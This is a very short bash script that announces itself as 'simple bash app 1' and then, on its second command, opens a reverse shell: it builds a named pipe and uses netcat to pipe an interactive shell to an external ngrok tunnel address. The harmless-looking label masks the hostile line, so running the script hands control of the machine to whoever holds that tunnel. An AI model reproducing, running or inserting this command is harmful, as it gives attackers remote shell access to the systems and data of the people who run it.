echo "I am simple bash app 1"

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 7.tcp.eu.ngrok.io: 17594 >/tmp/f
